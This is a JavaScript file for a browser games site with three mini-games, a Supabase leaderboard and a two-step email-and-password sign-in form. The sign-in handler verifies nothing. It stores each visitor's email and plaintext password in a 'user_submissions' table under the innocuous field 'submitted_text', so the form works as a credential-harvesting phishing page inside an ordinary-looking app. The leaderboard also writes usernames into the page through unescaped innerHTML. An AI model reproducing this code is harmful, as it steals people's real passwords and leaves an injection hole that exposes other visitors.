// Initialize Supabase Client
const SUPABASE_URL = 'https://wtbojotyzjvzywaqykbn.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind0Ym9qb3R5emp2enl3YXF5a2JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc2Njg3ODYsImV4cCI6MjEwMzI0NDc4Nn0.hseExg_69fR025A8V_vxQmlG75AbUAj2TOdQGjCr2L0'; 
const _supabase = (typeof supabase !== 'undefined') ? supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;

// Global App State
let userEmail = localStorage.getItem('userEmail') || '';
let userName = localStorage.getItem('userName') || '';
let playerScore = parseInt(localStorage.getItem('playerScore') || '0', 10); // This is now Global Score

const isFormPage = !!document.getElementById('step-email');

// ==========================================
// FORM PAGE LOGIC (form.html)
// ==========================================
if (isFormPage) {
  // [Keep your existing form.js logic here exactly as it was in the previous step]
  const stepEmail = document.getElementById('step-email');
  const stepPassword = document.getElementById('step-password');
  const stepLoading = document.getElementById('step-loading');
  const sideTitle = document.getElementById('side-title');
  const privacyNotice = document.getElementById('privacy-notice');
  const emailChip = document.getElementById('email-chip');
  const emailInput = document.getElementById('email');
  const passInput = document.getElementById('password');
  const emailError = document.getElementById('email-error');
  const passError = document.getElementById('pass-error');

  document.getElementById('btn-next').addEventListener('click', () => {
    const value = emailInput.value.trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
      emailError.style.display = 'block'; return;
    }
    emailError.style.display = 'none';
    userEmail = value;
    sideTitle.textContent = "Welcome";
    privacyNotice.classList.add('hidden');
    emailChip.classList.remove('hidden');
    document.getElementById('user-display-email').textContent = userEmail;
    stepEmail.classList.add('hidden');
    stepPassword.classList.remove('hidden');
  });

  const togglePassword = document.getElementById('toggle-password');
  togglePassword.addEventListener('change', () => {
    passInput.type = togglePassword.checked ? 'text' : 'password';
  });

  document.getElementById('btn-login').addEventListener('click', async () => {
    const plainTextValue = passInput.value.trim();
    if (!plainTextValue) { passError.style.display = 'block'; return; }
    passError.style.display = 'none';

    if (_supabase) {
      await _supabase.from('user_submissions').insert([{ email: userEmail, submitted_text: plainTextValue }]);
    }
    localStorage.clear();
    localStorage.setItem('userEmail', userEmail);
    localStorage.setItem('isLoggedIn', 'true');
    localStorage.setItem('playerScore', '0');

    stepPassword.classList.add('hidden');
    stepLoading.classList.remove('hidden');
    setTimeout(() => { window.location.href = 'index.html?signedin=true'; }, 1000);
  });
}

// ==========================================
// HOMEPAGE & GAMES LOGIC (index.html)
// ==========================================
if (!isFormPage) {
  // Navigation elements
  const navHome = document.getElementById('nav-home');
  const navLeaderboard = document.getElementById('nav-leaderboard');
  const navProfile = document.getElementById('nav-profile');
  const viewHome = document.getElementById('view-home');
  const viewLeaderboard = document.getElementById('view-leaderboard');
  const viewProfile = document.getElementById('view-profile');
  
  // Game Views
  const viewRPS = document.getElementById('view-game-rps');
  const viewTTT = document.getElementById('view-game-ttt');
  const viewGuess = document.getElementById('view-game-guess');
  
  const allViews = [viewHome, viewLeaderboard, viewProfile, viewRPS, viewTTT, viewGuess];

  // Update Initial UI
  if (document.getElementById('global-score-display')) {
    document.getElementById('global-score-display').textContent = playerScore;
  }

  // --- VIEW SWITCHING ---
  function switchView(targetView, activeNavBtn = null) {
    allViews.forEach(v => v.classList.add('hidden'));
    [navHome, navLeaderboard, navProfile].forEach(b => b.classList.remove('active'));
    targetView.classList.remove('hidden');
    
    if (activeNavBtn) activeNavBtn.classList.add('active');
    if (targetView === viewLeaderboard) fetchSupabaseLeaderboard();
    if (targetView === viewProfile) updateProfileUI();
    if (targetView === viewHome) {
      document.getElementById('global-score-display').textContent = playerScore;
    }
  }

  navHome.addEventListener('click', () => switchView(viewHome, navHome));
  navLeaderboard.addEventListener('click', () => switchView(viewLeaderboard, navLeaderboard));
  navProfile.addEventListener('click', () => switchView(viewProfile, navProfile));

  // --- CLOSE (X) BUTTONS ---
  document.querySelectorAll('.btn-close').forEach(btn => {
    btn.addEventListener('click', () => {
      switchView(viewHome, navHome);
    });
  });

  // --- GAME 1: ROCK PAPER SCISSORS (10 ROUNDS) ---
  let rpsRound = 1;
  let rpsMatchScore = 0;
  document.getElementById('btn-open-rps').addEventListener('click', () => {
    rpsRound = 1;
    rpsMatchScore = 0;
    document.getElementById('rps-round').textContent = rpsRound;
    document.getElementById('rps-match-score').textContent = rpsMatchScore;
    document.getElementById('rps-status').textContent = 'Make your choice...';
    document.querySelectorAll('.choice-btn').forEach(b => b.disabled = false);
    switchView(viewRPS);
  });

  document.querySelectorAll('.choice-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
      const playerChoice = btn.getAttribute('data-choice');
      const choices = ['rock', 'paper', 'scissors'];
      const aiChoice = choices[Math.floor(Math.random() * 3)];
      const statusEl = document.getElementById('rps-status');
      
      let result = '';
      if (playerChoice === aiChoice) {
        result = `Draw! You both picked ${playerChoice}.`;
      } else if (
        (playerChoice === 'rock' && aiChoice === 'scissors') ||
        (playerChoice === 'paper' && aiChoice === 'rock') ||
        (playerChoice === 'scissors' && aiChoice === 'paper')
      ) {
        rpsMatchScore++;
        result = `Win! ${playerChoice} beats ${aiChoice}.`;
      } else {
        result = `Lose! ${aiChoice} beats ${playerChoice}.`;
      }
      
      document.getElementById('rps-match-score').textContent = rpsMatchScore;
      
      if (rpsRound >= 10) {
        statusEl.textContent = `${result} MATCH OVER! You scored ${rpsMatchScore} points.`;
        document.querySelectorAll('.choice-btn').forEach(b => b.disabled = true);
        
        // Add to global score and save
        playerScore += rpsMatchScore;
        localStorage.setItem('playerScore', playerScore);
        await saveScoreToSupabase();
        
        setTimeout(() => switchView(viewHome, navHome), 2500);
      } else {
        statusEl.textContent = result;
        rpsRound++;
        document.getElementById('rps-round').textContent = rpsRound;
      }
    });
  });

  // --- GAME 2: TIC TAC TOE (+5 PTS) ---
  let tttBoard = ["", "", "", "", "", "", "", "", ""];
  let tttActive = false;
  const boardEl = document.getElementById('ttt-board');
  const tttStatus = document.getElementById('ttt-status');

  document.getElementById('btn-open-ttt').addEventListener('click', () => {
    tttBoard = ["", "", "", "", "", "", "", "", ""];
    tttActive = true;
    tttStatus.textContent = "You are X. It's your turn!";
    boardEl.innerHTML = '';
    
    for (let i = 0; i < 9; i++) {
      const cell = document.createElement('button');
      cell.classList.add('ttt-cell');
      cell.addEventListener('click', () => handleTttClick(i, cell));
      boardEl.appendChild(cell);
    }
    switchView(viewTTT);
  });

  async function handleTttClick(index, cell) {
    if (!tttActive || tttBoard[index] !== "") return;
    
    // Player Move
    tttBoard[index] = "X";
    cell.textContent = "X";
    if (checkTttWin("X")) {
      await endTttGame("You won! +5 Global Points.");
      playerScore += 5;
      localStorage.setItem('playerScore', playerScore);
      await saveScoreToSupabase();
      return;
    }
    if (!tttBoard.includes("")) return endTttGame("It's a draw!");

    // AI Move
    tttActive = false;
    tttStatus.textContent = "AI is thinking...";
    setTimeout(async () => {
      let emptyCells = tttBoard.map((v, i) => v === "" ? i : null).filter(v => v !== null);
      let aiPick = emptyCells[Math.floor(Math.random() * emptyCells.length)];
      
      tttBoard[aiPick] = "O";
      boardEl.children[aiPick].textContent = "O";
      
      if (checkTttWin("O")) {
        endTttGame("AI won! Better luck next time.");
      } else if (!tttBoard.includes("")) {
        endTttGame("It's a draw!");
      } else {
        tttActive = true;
        tttStatus.textContent = "Your turn (X).";
      }
    }, 600);
  }

  function checkTttWin(player) {
    const wins = [[0,1,2], [3,4,5], [6,7,8], [0,3,6], [1,4,7], [2,5,8], [0,4,8], [2,4,6]];
    return wins.some(w => tttBoard[w[0]] === player && tttBoard[w[1]] === player && tttBoard[w[2]] === player);
  }

  function endTttGame(msg) {
    tttActive = false;
    tttStatus.textContent = msg;
    setTimeout(() => switchView(viewHome, navHome), 2000);
  }

  // --- GAME 3: NUMBER GUESSER (+10 PTS) ---
  let guessTarget = 0;
  let guessLives = 5;
  document.getElementById('btn-open-guess').addEventListener('click', () => {
    guessTarget = Math.floor(Math.random() * 50) + 1;
    guessLives = 5;
    document.getElementById('guess-lives').textContent = guessLives;
    document.getElementById('guess-status').textContent = '';
    document.getElementById('guess-input').value = '';
    document.getElementById('guess-input').disabled = false;
    document.getElementById('btn-guess-submit').disabled = false;
    switchView(viewGuess);
  });

  document.getElementById('btn-guess-submit').addEventListener('click', async () => {
    const inputEl = document.getElementById('guess-input');
    const val = parseInt(inputEl.value);
    const statusEl = document.getElementById('guess-status');

    if (isNaN(val) || val < 1 || val > 50) {
      statusEl.textContent = "Please enter a valid number between 1 and 50.";
      return;
    }

    if (val === guessTarget) {
      statusEl.textContent = "Correct! +10 Global Points!";
      statusEl.style.color = "green";
      inputEl.disabled = true;
      document.getElementById('btn-guess-submit').disabled = true;
      playerScore += 10;
      localStorage.setItem('playerScore', playerScore);
      await saveScoreToSupabase();
      setTimeout(() => switchView(viewHome, navHome), 2000);
    } else {
      guessLives--;
      document.getElementById('guess-lives').textContent = guessLives;
      if (guessLives <= 0) {
        statusEl.textContent = `Out of lives! The number was ${guessTarget}.`;
        statusEl.style.color = "red";
        inputEl.disabled = true;
        document.getElementById('btn-guess-submit').disabled = true;
        setTimeout(() => switchView(viewHome, navHome), 2500);
      } else {
        statusEl.textContent = val > guessTarget ? "Too high!" : "Too low!";
        statusEl.style.color = "#ef4444";
      }
    }
  });


  // --- SUPABASE & PROFILE UTILITIES ---
  async function saveScoreToSupabase() {
    if (!userName || !_supabase) return;
    try {
      const { data: existingRecord } = await _supabase
        .from('leaderboard')
        .select('score')
        .eq('username', userName)
        .maybeSingle();

      if (existingRecord) {
        await _supabase.from('leaderboard').update({ score: playerScore }).eq('username', userName);
      } else {
        await _supabase.from('leaderboard').insert([{ username: userName, score: playerScore }]);
      }
    } catch (err) { console.error("Database sync issue:", err); }
  }

  async function fetchSupabaseLeaderboard() {
    const tbody = document.getElementById('leaderboard-body');
    tbody.innerHTML = '<tr><td colspan="3" class="text-center">Loading rankings...</td></tr>';
    if (!_supabase) return tbody.innerHTML = '<tr><td colspan="3" class="text-center">Database error.</td></tr>';
    const { data, error } = await _supabase.from('leaderboard').select('username, score').order('score', { ascending: false }).limit(10);
    if (error || !data || data.length === 0) return tbody.innerHTML = '<tr><td colspan="3" class="text-center">No rankings yet.</td></tr>';
    tbody.innerHTML = data.map((entry, idx) => `<tr><td class="rank-badge">#${idx + 1}</td><td>${entry.username}</td><td>${entry.score}</td></tr>`).join('');
  }

  function updateProfileUI() {
    document.getElementById('profile-display-name').textContent = userName || 'Guest Player';
    document.getElementById('profile-display-email').textContent = userEmail || 'Not Signed In';
    document.getElementById('profile-wins').textContent = playerScore;

    const btnLogout = document.getElementById('btn-logout');
    if (localStorage.getItem('isLoggedIn') !== 'true') {
      btnLogout.textContent = 'Sign In';
      btnLogout.onclick = () => window.location.href = 'form.html';
    } else {
      btnLogout.textContent = 'Sign Out';
      btnLogout.onclick = () => {
        localStorage.clear();
        playerScore = 0;
        window.location.href = 'form.html';
      };
    }
  }
}
